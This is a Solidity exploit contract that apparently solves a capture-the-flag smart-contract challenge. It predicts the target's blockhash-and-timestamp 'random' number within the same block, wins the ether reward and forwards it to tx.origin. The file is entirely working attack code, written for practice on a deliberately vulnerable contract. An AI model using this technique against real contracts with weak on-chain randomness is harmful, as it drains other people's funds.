pragma solidity ^0.4.21;

/// @notice Interface for interacting with the vulnerable challenge contract
interface IGuessTheNewNumberChallenge {
    /// @notice Returns true if the challenge has been solved
    function isComplete() external view returns (bool);

    /// @notice Allows the caller to submit a guess for the secret number
    function guess(uint8 n) external payable;
}

/// @title Exploit contract for GuessTheNewNumberChallenge
/// @notice This contract predicts the pseudo-random number used in the challenge
///         by replicating the exact hash logic, then submits the guess in the same block
contract GuessTheNewNumberAttacker {
    // Reference to the vulnerable challenge contract
    IGuessTheNewNumberChallenge public challenge;

    /// @notice Contract constructor, stores reference to the challenge contract
    /// @param _challenge Address of the deployed GuessTheNewNumberChallenge contract
    function GuessTheNewNumberAttacker(address _challenge) public payable {
        challenge = IGuessTheNewNumberChallenge(_challenge);
    }

    /// @notice Executes the attack by guessing the correct number
    function attack() public payable {
        // Ensure this contract has at least 1 ether to submit the guess
        require(address(this).balance >= 1 ether);

        // Predict the random number generated by the challenge contract
        // The original contract uses: uint8(keccak256(blockhash(block.number - 1), now))
        // So we replicate that exact logic here
        uint8 answer = uint8(uint256(keccak256(block.blockhash(block.number - 1), now)));

        // Submit the guessed number to the challenge with 1 ether
        challenge.guess.value(1 ether)(answer);

        // Confirm that the challenge was solved
        require(challenge.isComplete());

        // Send remaining balance (2 ETH reward) back to the EOA (Externally Owned Account)
        // using tx.origin to trace back to the original caller
        tx.origin.transfer(address(this).balance);
    }

    /// @notice Fallback function to allow the contract to receive ETH
    function() public payable {}
}
